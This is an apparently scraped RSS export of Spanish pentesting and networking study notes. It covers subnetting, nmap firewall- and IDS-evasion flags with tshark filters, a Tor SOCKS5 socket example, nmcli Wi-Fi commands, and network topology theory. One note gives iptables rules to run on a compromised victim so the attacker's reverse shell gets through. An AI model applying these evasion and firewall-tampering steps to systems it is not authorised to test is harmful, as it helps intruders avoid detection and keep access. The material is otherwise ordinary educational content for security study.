<br>La Broadcast Address es la dirección de red que se utiliza para enviar paquetes a todos los hosts de la subred. Para calcularla, necesitamos saber el Network ID y la cantidad de hosts disponibles en la subred. <br>En este caso teniamos el CIDR  -&gt; /26, estos 26 bits correspondientes a la red y los 6 bits restantes correspondientes a los hosts disponibles, lo que hay que hacer para calcular la Broadcast Addres es converir la Network ID a binario "11000000.10101000.00000001.00000000" y rellenar los bits disponibles para la signación de hosts con "1", dando como resultado: <br><br>Una vez más esto lo podemos saber haciendo: <br>
echo "ibase=2; 11000000" | bc).$(echo "ibase=2; 10101000" | bc).$(echo "ibase=2; 00000001" | bc).$(echo "ibase=2; 00111111" | bc
Copy<br>Con todo esto podemos interpretar de manera rapida los rangos de red que el cliente nos ofrece para auditar.<br><br><br><img alt="Firewall.png" src="https://dobliuw.com/lib/media/firewall.png"><br>Los firewalls son un dispositivo en la red que monitorean el trafico de la misma y son diseñados para proteger las redes y sistemas de posibles amenazas. <br>Muchas veces cuando hay un firewall arroja resultados filtrados en un escaneo de nmap. <br>Algunas tecnicas junto a su parametro de <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a> a continuación: <br><br>La técnica de evasión de MTU o "Maximum Transmission Unit" implica ajustar el tamaño de los paquetes que se envían para evitar la detección por parte del  Firewall. Nmap permite configurar manualmente el tamaño máximo de los paquetes para garantizar que sean lo suficientemente pequeños para parasar por el Firewall sin ser detectados. (Multiplo de 8 el valor)<br><br>Esta técnica se base en ajustar la longitud de los datos enviados para que sean lo suficientemente cortos como para pasar por el Firewall sin ser detectados. Nmap permite a los usuarios configurar manualmente la longitud de los datos enviados para que sean lo suficientemente pequeños para evadir la detección del Firewall. El length minimo de un paquete que envia nmap, siempre va a ser de 58, pero este valor lo podemos alterar sumandole lo que pongamos como número como arg del --data-length<br>sudo nmap -p22 192.168.1.1 --data-length 21
Copy<br><img alt="FirewallLenght.png" src="https://dobliuw.com/lib/media/firewalllenght.png"><br><br>Esta técnica consiste en configurar manualmente el número de puertos de origen de los paquetes enviados para evitar la detección por parte del Firewall. Nmap permite a los usuarios especificar manualmente un puerto de origen aleatorio o un puerto específico para evadir la detección de Firewall. Basicamente nmap lo que hace es abrir un puerto aleatorio para poder establecer conexión, pero con este ataque podemos ingresar un puerto en particular.<br>nmap {to_scan_ip} --source-port 53
Copy<br><img alt="SYNACKRST.png" src="https://dobliuw.com/lib/media/synackrst.png"><br><br>Esta técnica de evasión en Nmap permite al usuario enviar paquetes falsos a la red para confundir a los sistemas de detección de intrusos y evitar la detección de Firewall. El comando -D permite al usuario enviar paquetes falsos junto con los paquetes reales de escaneo para ocultar su actividad. Basicamente con el parametro -D podemos ingresar una o unas IP's falsas para enviar estos paquetes falsos, una vez más, con wiresharw o tshark podriamos ver esto: <br>nmap -p22 -D 11.11.11.11 {to_scan_ip}
Copy<br><img alt="FirewallIPS.png" src="https://dobliuw.com/lib/media/firewallips.png"><br>
Si hicieramos un ataque Decoy con muchas ip, podriamos filtrar con wireshark los apquetes que tengan de destino nuestra IP especificada con ip.dst == {to_scan_ip}<br><br>Esta técnica se basa en fragmentar los paquetes enviados para que el Firewall no pueda reconocer el tráfico como un escaneo. La opción -f en Nmap permite fragmentar los paquetes y enviarlos por separado para evitar la detección del Firewall. <br>Para ver los paquetes fragmentados desde wireshark podriamos ingresar  ip.flags.mf == 1<br><img alt="FirewallFramentation.png" src="https://dobliuw.com/lib/media/firewallframentation.png"><br><br>Esta técnica de evasión se basa en cambiar la dirección MAC del paquete para evitar la detección del Firewall. Nmap permite configurar manualmente la dirección MAC ( Explicada en <a data-href="Basic Concepts" href="https://dobliuw.com/notes/2.-networks/basic/redes/basic-concepts.html" class="internal-link" target="_self" rel="noopener nofollow">Basic Concepts</a>) para evitar la detección. <br><br>Esta técnica es una de las más usadas para realizar escaneos sigilosos y evitar la detección del Firewall. El comando -sS permite a los usuarios realizar un escaneo de tip SYN sin establecer una conexión completa, lo que permite evitar la detección. Esto lo que hace es lo sig:<br><img alt="ThreeWayHandshake.png" src="https://dobliuw.com/lib/media/threewayhandshake.png"><br>En una conexión exitosa normal, se tramita un paquete SYN, donde el host responde con un paquete SYN/ACK, en caso de estar cerrado con un RST package, para posteriormente en caso de que este disponible enviar un paquete ACK y establecer la conexión. Al utilizar el Stealth Scan lo que hacemos es enviar el paquete SYN, nos responde con SYN/ACK o RST, depende su estado, y si esta disponible, en lugar de enviar un ACK enviamos un RST para no terminar de completar la conexión, de esta manera sabemos que el host esta disponible pero no nos conectamos, siendo asi más sigilosos.<br>Con herramientas como wireshark o tshark podríamos visualizar este tipo de conexiones, por ejemplo, si realizamos un escaneo con nmap del puerto 80 de un host, podríamos interceptar y filtrar tanto los paquetes SYN, como SYN-ACK, como ACK.<br>Escaneo sin Stealth Scan (-sS):<br>nmap -p80 {target_IP} 
Copy<br>Filtrado de paquetes con tshark:<br># Intercept a SYN packet
tshark -i {interface} -Y 'tcp.flags.syn == 1 and tcp.flags.ack == 0 and tcp.dstport == 80' 2&gt;/dev/Null
# Intercept a SYN-ACK packet
tshark -i {interface} -Y 'tcp.flags.syn == 1 and tcp.flags.ack == 1 and tcp.srcport == 80' 2&gt;/dev/Null
# Intercept a ACK and ACK-RST packet
tshark -i {interface} -Y 'tcp.flags.syn == 0 and tcp.flags.ack == 1 and tcp.dstport == 80' 2&gt;/dev/Null
Copy<br><img alt="trhee_way_handshake_example_with_tshark.png" src="https://dobliuw.com/lib/media/trhee_way_handshake_example_with_tshark.png"><br>En cambio, si realizamos un escaneo de nmap con Stealth Scan (-sS):<br>sudo nmap -p80 -sS {target_IP}
Copy<br>A la hora de filtrar paquetes ACK o ACK-RST veremos que no se lográ capturar ninguno de estos tipos, simplemente podrémos capturar un paquete RESET:<br># Intercept a RESET packet
tshark -i {interface} -Y 'tcp.flags.reset == 1 and tcp.dstport == 80' 2&gt;/dev/null
Copy<br><img alt="three_way_handshake_with_stealth_scan_nmap_example_tshark.png" src="https://dobliuw.com/lib/media/three_way_handshake_with_stealth_scan_nmap_example_tshark.png"><br>Como podemos ver, con el Stealth Scan estamos enviando al servidor un paquete RST en lugar de un ACK.<br><br>Esta técnica permite al usuario controlar la velocidad de los paquetes enviados para evitar la detección del Firewall. El comando --min-rate permite al usuario reducir la velocidad de los paquetes enviados para evitar ser detectado.<br>De más esta decir que existen más tecnicas para evasión de firewall, pero estas son de las más populares. ]]></description><link>https://dobliuw.com/notes/2.-networks/basic/redes/basic-concepts.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/Redes/Basic Concepts.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 15:20:19 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/basic_connection.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/basic_connection.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Sockets]]></title><description><![CDATA[ 
 <br><br>Los sockets son puntos finales (endpoints) de una comunicación bidireccional entre dos nodos de una red. Son una abstracción que permite la comunicación a través de una red, independientemente del protocolo subyacente (TCP, UDP, etc).<br><br>Stream Sockets (Sockets de flujo):<br>
<br>Protocolo subyacente: TCP.
<br>Características: Orientado a la conexión, garantiza la entrega de datos en el mismo orden en que se envían, es decir que es confiable.
<br>Uso típico: COmunicación cliente-servidor donde se enecesita confiabilidad, como HTTP, FPT, etc.
<br>Datagram Sockets (Sockets de datagrama):<br>
<br>Protoclo subyacente: UDP.
<br>Características: No orientado a conexión, no garantiza entrega ni orden, menos sobrecarga que TCP.
<br>Uso típico: APlicaciones donde la velocidad es crítica y cierta pérdida de datos es aceptable, como la transmisión de video en tiempo real, juegos en línea, etc.
<br>Direcciones y Puertos:<br>
<br>IP Address: Identifcia un dispisitivo en la red.
<br>Port: Identifica una aplicación o proceso específico en el dispositivo.
<br>Socket Address: Combinación de una dirección IP y un puerto.
<br><br><br>Por ejemplo podríamos hacer uso de lenguajes como Python para llevar a cabo el uso de sockets creando un cliente y un servidor con librerias como socket, o incluso podríamos hacer uso de la herramienta tor (Proyecto que utiliza nodos proxies utilizados para anonimizar el tráfico) la cual crea un socks5 y haciendo uso de librerías como socks podríamos crear un socket que se conecte al proxy proporcionado por tor.<br>import socket, socks

# Configure SOCKS5 proxy to use TOR
socket.set_default_proxy(socks.SOCKS5, "{host_proxy_tor_ip}", {host_proxy_tor_port})
socket.socket = socks.socksocket

# Create a socket to use proxy TOR
try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(("{any_server_web}", {any_server_port})) # Connection throught TOR
	s.sendall(b"GET / HTTP/1.1\r\nHost: {any_server_web}\r\n\r\n")
	response = s.recv(4096)
	print(response.decode())
	s.close()
except Exception as e:
	print(f"An error ocurred: {e}")
Copy]]></description><link>https://dobliuw.com/notes/2.-networks/basic/redes/sockets.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/Redes/Sockets.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 20 May 2024 19:53:47 GMT</pubDate></item><item><title><![CDATA[Linux conection Wi-Fi]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:comandos" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#comandos</a> <a class="tag" href="https://dobliuw.com/?query=tag:basico" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#basico</a> <a class="tag" href="https://dobliuw.com/?query=tag:redes" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#redes</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:comandos" class="tag" target="_blank" rel="noopener nofollow">#comandos</a> <a href="https://dobliuw.com?query=tag:basico" class="tag" target="_blank" rel="noopener nofollow">#basico</a> <a href="https://dobliuw.com?query=tag:redes" class="tag" target="_blank" rel="noopener nofollow">#redes</a>
<br><br><br># Listar estado de las interfazes de red
nmcli dev status 
# Verificar estado de una determinada interfaz de red
nmcli radio wifi 
# Habilitar Wi-Fi
nmcli radio wifi on
# Buscar redes Wi-Fi cercanas
nmcli dev wifi list
# Establecer conexión con red Wi-Fi
nmcli dev wifi connect {network-ssid}
# Con seguridad WEP o WPA indiicar contraseña
nmcli dev wifi connect {network-ssid} password "{network-passwd}"
# --ask para no tipear password en pantalla
Copy<br><br># Listar conexiones guardadas
nmcli con show
#  Desconectarse da la conexión
nmcli con down {ssid/uuid}
# Para conectarse a otra red
nmcli con up {ssid/uuid} 
Copy]]></description><link>https://dobliuw.com/notes/2.-networks/basic/linux-conection-wi-fi.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/Linux conection Wi-Fi.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 16 May 2024 14:08:48 GMT</pubDate></item><item><title><![CDATA[WiFiConnections_draw]]></title><description><![CDATA[ 
 
  
  
  
    
  
  AP (Access Point)DispositivosEnvia CredencialesMensaje de confirmación y asigna IP por DHCP132451) 2)3)4)5)El dispositivo envía una solicitud de conexión al AP enviando su SSID y credenciales (Nombre de usuario y contraseña,El AP verifica si las credenciales son válidas comparando la información recibida con su base de datos de usuarios aturizados.Si las credenciales son válidas, el AP envía un mensaje de confirmación al dispositivo y asignauna dirección IP mediante el protocolo DHCP.El dispositivo acepta la dirección IP asignada y establece una conexión con el AP.Una vez  que se establece la conexión, el dispositivo puede enviar y recibir datos a través de la red Wi-Fi.]]></description><link>https://dobliuw.com/notes/2.-networks/basic/wificonnections_draw.html</link><guid isPermaLink="false">Notes/2. Networks/Basic/WiFiConnections_draw.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Dec 2023 15:03:11 GMT</pubDate></item><item><title><![CDATA[Añadir tráfico con nuestra máquina]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:avanzado" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#avanzado</a> 
 <br><br>
<br>Tags <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:avanzado" class="tag" target="_blank" rel="noopener nofollow">#avanzado</a> 
<br><br><br>Iptables es una herramienta avanzada de friltrado de paquetes en Linux. Se encarga de analizar cada uno de los paquetes del tráfico de red entrante y deicid, en función de un conjunto de reglas, qué hacer con cada paquete recibido.<br><br><br>De cara a auditorías que estemos realizando, nos podríamos encontrar con el caso en donde hayan reglas de firewall e iptables conifugaradas evitando así que podamos por ejemplo, entablar una reverse shell o una bind shell, obviamente ante estas situaciones podemos pensar en una Forward shell, pero en caso de que contemos con <a data-href="RCE - (Remote Command Execution)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/rce-(remote-command-execution).html" class="internal-link" target="_self" rel="noopener nofollow">RCE - (Remote Command Execution)</a> como root mediante por ejemplo, una fakeshell, podríamos intentar retocar las reglas de iptables para configurar la conexión exitosa entre nuestra máquina de atacantes contra la máquina victima. <br>iptables -A INPUT -p tcp -d {our_ip} -j ACCEPT
Copy<br>Esta regla se aplica al tráfico entrante (INPUT) en el protocolo TCP que está destinado a la dirección IP especificada. Con esta regla permitimos que el tráfico TCP que entra a la máquina victima proveniente de nuestra máquina de atacantes sea aceptado y llegue al sistema. <br>iptables -A OUTPUT -p tcp -d {our_ip} -j ACCEPT
Copy<br>Esta regla se aplica al tráfico saliente (OUTPUT) en el protocolo TCP que tiene como destino la dirección especificada. Con esta regla permitimos que el tráfico TPC saliente hacia nuestra máquina de atacantes sea aceptado y salga del sistema. ]]></description><link>https://dobliuw.com/notes/2.-networks/iptables/añadir-tráfico-con-nuestra-máquina.html</link><guid isPermaLink="false">Notes/2. Networks/Iptables/Añadir tráfico con nuestra máquina.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 26 Feb 2024 23:15:28 GMT</pubDate></item><item><title><![CDATA[Networks]]></title><description><![CDATA[ 
 <br><br>Una red permite a dos hosts comunicarse entre si. Existe una amplia gama de topologias (mesh / tree / star), medios (ethernet / fiber / coax / wireless) y protocolos ( TCP / UDP / IPX) que pueden ser utilizados para facilitar las conexiones. <br><img alt="basic_connection.png" src="https://dobliuw.com/lib/media/basic_connection.png"><br>Todo internet esta basado en muchas redes subdivididas, por ejemplo, en esta imagen tenemos por un lado la Home Network y por otro la Company Network. Supongamos que queremos visitar el servicio web de la compañia (Alojado en Company Network) desde nuestra red Home Network, nosotros sabemos la dirección del servicio web o más conocido como Uniform Resource Locator (URL) que ingresamos en nuestro navegador, también conocido como Fully Qualified Domain Name (FQDM).<br>
<br>URL (<a rel="noopener nofollow" class="external-link" href="https://www.hackthebox.eu/resource?query=xdata" target="_blank">https://www.hackthebox.eu/resource?query=xdata</a>): puede contener parametros que determinen una parte especifica de la página web.
<br>FQDN (<a data-tooltip-position="top" aria-label="http://www.hackthebox.eu" rel="noopener nofollow" class="external-link" href="http://www.hackthebox.eu" target="_blank">www.hackthebox.eu</a>): solo especifica la página web.
<br>En este simple ejemplo, la conexión comenzaria desde nuestro dispositivo localizado en Home Network el cual trámita una petición al servicio web de la compañia mediante nuestro router, el cual se conecta con nuestro ISP (Proveedor de servicio de internet), el cual a su vez nos permite conectarnos a internet para realizar una petición a un servidor DNS, quien resuelve la url de la página web de la compañia solicitada a una dirección IP, la cual finalmente se utiliza para enviar nuestra petición a la máquina que hostea dicha página web. Una vez recibida la petición, la máquina que hostea la página web de la compañia hace uso del router de la Company Network para conectarse a su ISP y devolvernos la petición previamente realizada.<br><br><br>Todas las computadoras que están conectadas a una red y participan directamente en la comunicación de la red se clasifican como hosts. Los hosts se pueden llamar endpoints (Dispositivos finales) que se refiere a aquellos hosts alcanzables dentro de una red. <br>Algunos hosts también se llaman clientes, siendo estos un tipo de hosts que disponen de software para solicitar y mostrar la información obtenida de los servidores.<br>Sin embargo, el término de hosts se refiere específicamente a los dispositivos de la red a los que se asigna una dirección de protocolo de internet (Dirección IP) para fines de comunicación.<br>Por otro lado, los servidores son dispositivos con software que les permite proporcionar información, como correo electrónico o páginas web, a otros endpoints de la red. Cada servicio requiere un software de servidor independiente.<br><br><br>Los dispositivos intermedios conectan los endpoints individuales a la red. Pueden conectar múltiples redes individuales para formar una red interna. Estos dispositivos intermedios proporcionan conectivadad y garantizan el flujo de datos en toda la red.<br>Los dispositivos intermedios usan la dirección del endpoint de destino, junto con la información sobre las interconexiones de la red, para determinar la ruta que los mensajes deben tomar a través de la red. Estos dispositivos pueden admitir alguna de las siguientes funciones o todas ellas:<br>
<br>Regenerar y retrasnimtir señales de comunicación.
<br>Conservar información acerca de las rutas que existen a través de la red y de internetwork.
<br>Notificar a otros dispositivos de errores y las fallas de comunicación.
<br>Dirigir los datos a lo largo de rutas alternativas cuando hay una falla en el enlace.
<br>Clasificar y dirigir mensajes de acuerdo a las prioridades.
<br>Permitir o denegar el flujo de datos de acuerdo a los parámetros de seguridad.
<br>Algunos de estos dispositivos son Routers inálambricos, Switch LAN, Router, Swtich Multicapa y dispositivos de firewall.<br><img alt="intermediate_network_devices.png" src="https://dobliuw.com/lib/media/intermediate_network_devices.png"><br><br><br>La comunicación en una red se transmite a través de medios. El medio proporciona el canal por el cual viaja el mensaje desde el origen hasta el destino.<br>Las redes modernas utilizan princiaplemnte trest tipos de medios para interconectar dispositivos...<br>
<br>Hilos metálicos dentro de cables. En este caso los datos se codifican en impulsos eléctricos.
<br>Fibras de vidrio o plástico (Cable de fibra óptica). En este caso los datos se codifican como pulsos de luz.
<br>Transmisión inalámbrica. En este otro caso los datos se codifican a través de la modulación de frecuiencias específicas de ondas electromagnéticas.
<br><img alt="network_media.png" src="https://dobliuw.com/lib/media/network_media.png"><br>Los cuatro criterios principales a tener en cuenta y hacerse para elegir estos medios de red son:<br>
<br>¿Cuál es la distancia máxima en la que el medio puede transportar una señal exitosamente?
<br>¿Cuál es el entorno en el que se instalarán los medios?
<br>¿Cuál es la cantidad de datos y a qué velocidad deben transmitirse?
<br>¿Cuál es el costo del medio y de la instalación?
]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/0.-network-components.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/1. Structure/0. Network Components.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 29 Aug 2024 19:17:35 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/basic_connection.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/basic_connection.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Network Representation]]></title><description><![CDATA[ 
 <br><br>Los arquitectos y administradores de redes deben poder mostrar el aspecto que tendrán sus redes, para ello necesitan poder ver fácilmente qué componentes se conectan a otros componentes, dónde se ubicarán y cómo se conectarán. Los diagramas de redes a menudo usan símbolos, como los que se muestran en la siguiente imagén, para representar los diferentes endpoints, intermediate devices y network media: <br><img alt="network_representation_image.png" src="https://dobliuw.com/lib/media/network_representation_image.png"><br>Además de estas representaciones, se utiliza una terminología especializada para descubrir cómo cada uno de estos dispositivos y medios se conectan entre sí:<br>
<br>NIC (Network Interface Card): Una NIC conecta físicamente el endpoint a una red.
<br>Physical Port: Un conector o conexión en un dispositivo de red donde se conectan los medios a un terminal u otro dispositivo de red.
<br>Interface: Puertos especializados en un dispositivo de red que se conecta a redes individuales. Debido a que los routers conectan redes, los puertos en un router se denominan interfaces de red.
<br><br><br>Una Topología de red es una disposición típica y una conexión física o lógica de dispositivos en una red. Las computadoras son hosts, como clientes y servidores, que utilizan activamente la red. También incluyen componentes de red como switches, bridges y routers que tienen una función de distribución y garantizan que todos los hosts de la red puedan establecer una conexión lógica entre sí. La topología de la red determina los componentes a utilizar y los métodos de acceso a los medios de transmisión.<br>El diseño del medio de transmisión utilzado para conectar dispositivos es la topología física de la red. Para medios conductores o de fibra de vidrio, esto se refiere al plan de cableado, las posiciones de los nodos y las conexiones entre los nodos y el cableado. Por el contrario, la topología lógica es cómo actúan las señales en los medios de la red o cómo se trnasmitirán los datos a través de la red desde un dispositivo dhasta la conexión física de los dispositivos. <br><br>Los nodos de red son los puntos de conexión del medio de transmisión a los transmisores y receptores de señales eléctricas, ópticas o de radio en el medio. Un nodo puede estar conectado a una computadora, pero ciertos tipos pueden terner solo un microcontrolador en un nodo o pueden no tener ningún dispositivo programable.<br><br>Podemos imaginar una topología como una forma o estructura virtual de una red. Esta forma no se corresponde necesariamente con la disposivión física real de los dispositivos en la red. Por tanto, por un lado podemos entender que existe, por un lado, la topología física y por otro lado la topología lógica. Por ejemplo, las computadores en una LAN pueden estar dispuestas en círculos en un dormitorio, per es muy poco probable que tengan una topología de anillo real.<br>Las topologías de red se dividen en ocho tipos básicos: <br><img alt="topology_types.png" src="https://dobliuw.com/lib/media/topology_types.png"><br>
(Se pueden construir topologías de redes más complejas siendo estas el hibrido entre dos o más de estas basicas topologías).<br><br>La topología de red más simple con una conexión dedciada entre dos hosts. En esta topología, existe un vínculo físico directo y directo sólo entre dos hosts. Estos dos dispositivos pueden utilizar estas cvonexiones para la comunicación mutua.<br>
Las topologías Point-to-Point son el modelo básico de la telefonía tradicional y no deben confundirse con la arquitectura P2P (Peer-to-Peer).<br><img alt="point-to-piont_topology.png" src="https://dobliuw.com/lib/media/point-to-piont_topology.png"><br><br>Todos los hosts estan conectados a través de un medio de transmisión. Cada host tiene acceso al medio de transmisión y a la señales que se transmiten a través de él. No existe un componente de red central que controle los procesos en ella. El medio de transmisión para esto puede ser, por ejemplo, un cable coaxial.<br>
Dado que el medio se comparte con todos los demás, sólo un host puede enviar y todos los demás sólo pueden recibir y evaluar los datos (Y ver si están destinados a sí mismos).<br><img alt="bus_topology.png" src="https://dobliuw.com/lib/media/bus_topology.png"><br><br>La topología de estrella (star) es un componente de red que mantiene una conexión con todos los hosts. Cada host esta conectado a un componente de red central mediante un enlace separado. Este usualmente es el router, un hub o un switch. Esto maneja la función de reenvío de los paquetes de datos. Para ello, los paquetes son recibidos y reenviados al destino. El tráfico de datos en el componente central de red puede ser muy alto ya que todos los datos y conexiones pasan por él.<br><img alt="star_topology.png" src="https://dobliuw.com/lib/media/star_topology.png"><br><br>La topología de anillo (ring) física es tal que cada host o nodo está conectado al anillo con dos cables...<br>
<br>Uno para las señales entrantes.
<br>Otro para las señales salientes.
<br>Esto significa que un cable llega a cada host a la par que un cable sale. Esta topología habitualmente no requiera un componente de red activo. El control y acceso al medio de transmisión están regulados por un protocolo al que adhieren todas las estaciones.<br>Una topología de anillo (ring) lógica se basa en una topología física en estrella, donde un distribuidor en el nodo simula el anillo reenviando de un puerto al siguiente.<br>La información se transmite en una dirección de transmisión predeterminada. Normalmente, se accede secuencialmente al medio de transmisión de una estación a otra utilizando un sistema de recuperación desde la estación central o un token. Un token es un patrón de bits que pasa continuamente a través de una red en anillo en una dirección, que funciona de acuerdo con el proceso de reclamo de token.<br><img alt="ring_topology.png" src="https://dobliuw.com/lib/media/ring_topology.png"><br><br>Muchos nodos deciden las conexiones a nivel físico y el enrutamiento a nivel lógico en redes malladas (mesh). Por lo tanto, las estructuras malladas no tienen un topología fija. Hay dos estructuras básicas según el concepto básico: la estructura totalmente mallada y la estructura parcialmente mallada.<br>Cada host está conectado a todos los demás hosts de la red en una estructura completamente mallada (fully meshed structure). Esto significa que los anfitriones están entrelazados entre sí. Esta técnica se utiliza principalemtne en WAN o MAN para garantizar una alta confiabilidad y ancho de banda.<br>En esta configuración, nodos importantes de la red (Como routers) podrían ser conectados emtre si. De esta manera, si un router falla, los demás pueden seguir funcionando sin probelmas y la red puede absorber el fallo debido a las muchas conexiones. <br>Cada nodo de una topología completamente mallada (fully meshed) tiene las mismas funciones de enrutamiento y conoce los nodos vecinos con los que puede comunicarse cerca del gateway de la red y de las cargas de tráfico.<br>En la estructura parcialmente mallada (partially meshed), los endpoints están conectados mediante una sola conexión. En este tipo de topología de red, nodos específicos están conectados exactamente a otro nodo, y algunos otros nodos están conectados a dos o más nodos con una conexión point-to-point.<br><img alt="mesh_topology.png" src="https://dobliuw.com/lib/media/mesh_topology.png"><br><br>Las topología en forma de árbol (Tree) no son más que una topología en forma de estrella (start) extendida, la cual suele ser adoptada por redes locales más extensas. Esto es especialmetne útil cuando se combinan varias topologías. Esta topología se utiliza a menudo, por ejemplo, en edificios empresariales de gran tamaño.<br>Existen tanto estrcutas de árbol lógicas según el spanning tree como físicas. Las redes modernas modulares, basadas en cableado estructurado con jerarquía de concentradores, también tiene una estrucutra de árbol. Las topologías de árbol también se utilizan para redes de banda ancha y redes urbanas (MAN).<br><img alt="tree_topology.png" src="https://dobliuw.com/lib/media/tree_topology.png"><br><br>Las redes hibridas (Hybrid) combinan dos o más topologías lo que da como resultadoque la red no presente ninguna topología estándar. Por ejemplo, una red en árbol puede representar una topología híbrida en la que las redes en estrella están conectadas a través de redes de bus interconectadas. sin embargo, una red de árboles que está vinculada a otra red de arboles isgue siendo topológicamente una red de árboles. Una topología híbrida siempre se crea cuando se interconectan dos topologías de red básicas diferentes.<br><img alt="hybrid_topology.png" src="https://dobliuw.com/lib/media/hybrid_topology.png"><br><br>En la topología de cadena (Daisy Chain), se conectan varios hosts colocando un cable de un nodo a otro.<br>Dado que esto crea una cadena de conexiones, también se conoce como configuración en cadena en la que se conectan varios componentes de hardware en serie. Este tipo de conexión en red se enceuntra a menudo en tecnología de automatización (CAN).<br>La conexión en cadenas se basa en la siposición física de los nodos, a difrencia de los procedimientos de toekn, que son estructurales pero pueden hacerse independcientemente del diseño físico. la señal envía hacia y desde un componente a través de sus nodos anteriores al sistema informático.<br><img alt="daisy_chain_topology.png" src="https://dobliuw.com/lib/media/daisy_chain_topology.png"><br><br><br>Los diagramas de topologías son documentación obligatoria para cualquier persona que trabaje con una red. Estos diagramas proporcionan un mapa visual que muestrá cómo está conectada la red, y al igual que las topologías, existen dos tipos de diagramas de topologías, físicos y lógicos.<br><br>Los diagramas de topología física ilustran la ubicación física dce los dispositivos intermedios y la instalación del cable, como se muestra en la siguiente imagen. Podes encontrar en estos diagramas las ahbitaciones en las que se encuentran estos dispositivos, los racks, etc.<br><img alt="physical_topologie_diagram.png" src="https://dobliuw.com/lib/media/physical_topologie_diagram.png"><br><br>Por otro lado, los diagramas de topología lógica ilustran los dispositivos, los puertos y el esquema de direccionamiento de la red, como se muestra en la siguiente imagen. Podemos encontrar los enpoints conectados, a que dispositivos intermedios y mediante que medios.<br><img alt="logical_topology_diagram.png" src="https://dobliuw.com/lib/media/logical_topology_diagram.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/1.-structure/1.-topologies-and-network-representation.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/1. Structure/1. Topologies and network representation.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 30 Aug 2024 14:43:01 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/network_representation_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/network_representation_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Network Types &amp; Structure]]></title><description><![CDATA[ 
 <br><br>Cada red es estructurada de manera diferente y puede ser configurada individualmente. Por esta razón, existen los llamados types (Tipos) y topologies (Topologias) que pueden usarse para categorizar estas redes.<br> <img alt="common_network_types.png" src="https://dobliuw.com/lib/media/common_network_types.png"><br>
<img alt="book_network_types.png" src="https://dobliuw.com/lib/media/book_network_types.png"><br><br>Las redes LANs (Local Area Networks) y las WLANs (Wireless Local Area Networks) normalmente asignarán direcciones IP designadas para uso local (RFC 1918, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). En alugnos casos, como universidades u hoteles, es posible que se asigne una dirección ip routable (Internet) para unirse a la LAN, pero eso es muy poco común. No existe nada diferente entre LAN o WLAN, aparte de que las WLAN introducen la habilidad de trasnmitir datos con la falta de cables.<br><img alt="LAN_example_image.png" src="https://dobliuw.com/lib/media/lan_example_image.png"><br><br>La red WAN (Wide Area Network) mayormente es referida como Internet. Cuando estemos manejando equipamiento de redes, mayormente tendremos una dirección WAN y una dirección LAN. La dirección WAN es la dirección con la que generalmente accedemos a internet, dicho esto, no incluye internet; una WAN es solo una gran cantidad de redes LAN unidas. Muchas empresas grandes o agencias gubernamentales tendrán una "WAN Interna" (También llamada intranet, Red Airgap, etc.).<br>
Generalmente, una de las primeras maneras de identificar que estamos en una red WAN es si se utilizan protocolos de enrutamiento específicos como BGP y si el IP Schema en uso no está dentro del RFC 1918 (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). <br><img alt="WAN_example_image.png" src="https://dobliuw.com/lib/media/wan_example_image.png"><br><br>Existen tres tipos de VPNs (Virtual Private Networks), pero las tres tienen el mismo uso de permitir a un usuario sentir que esta conectado a una red diferente.<br>
<br>
